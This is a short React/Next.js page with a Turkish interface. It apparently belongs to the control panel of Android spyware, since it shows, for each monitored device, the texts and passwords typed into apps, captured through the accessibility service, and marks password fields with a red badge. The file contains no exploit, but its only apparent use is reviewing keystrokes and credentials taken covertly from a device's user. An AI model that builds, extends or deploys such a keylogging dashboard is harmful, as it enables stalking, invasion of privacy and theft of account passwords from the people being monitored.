'use client';

import { Suspense } from 'react';
import { api, InputLogItem, formatDate } from '@/lib/api';
import { useDevicePage } from '@/hooks/useDevicePage';
import { DataActions } from '@/components/DataActions';
import { PageShell } from '@/components/ui/PageShell';
import { TableSkeleton } from '@/components/ui/LoadingSkeleton';

function InputsContent() {
  const page = useDevicePage<InputLogItem>(api.getInputLogs);

  return (
    <PageShell
      title="Yazılan Metinler"
      subtitle="Uygulamalara girilen metinler ve şifreler"
      emptyTitle="Kayıt yok"
      emptyHint="Erişilebilirlik servisi açık olmalı."
      isEmpty={page.data.length === 0}
      skeleton={<TableSkeleton />}
      extraFilters={
        <DataActions deviceId={page.selectedDevice} dataType="input-logs" onChanged={page.onRefresh} />
      }
      {...page}
    >
      <div className="data-table-wrap">
        <table className="data-table min-w-[640px]">
          <thead>
            <tr>
              <th>Uygulama</th>
              <th>Alan</th>
              <th>Metin</th>
              <th>Tür</th>
              <th>Tarih</th>
            </tr>
          </thead>
          <tbody>
            {page.data.map((e) => (
              <tr key={e.id}>
                <td>{e.appName || e.appPackage}</td>
                <td className="text-gray-500">{e.fieldName || '-'}</td>
                <td className="font-mono text-xs break-all max-w-[200px]">{e.text}</td>
                <td>
                  <span className={e.isPasswordField ? 'badge-red' : 'badge-gray'}>
                    {e.isPasswordField ? 'Şifre' : 'Metin'}
                  </span>
                </td>
                <td className="text-gray-500 whitespace-nowrap">{formatDate(e.timestamp)}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </PageShell>
  );
}

export default function InputsPage() {
  return (
    <Suspense fallback={<TableSkeleton />}>
      <InputsContent />
    </Suspense>
  );
}
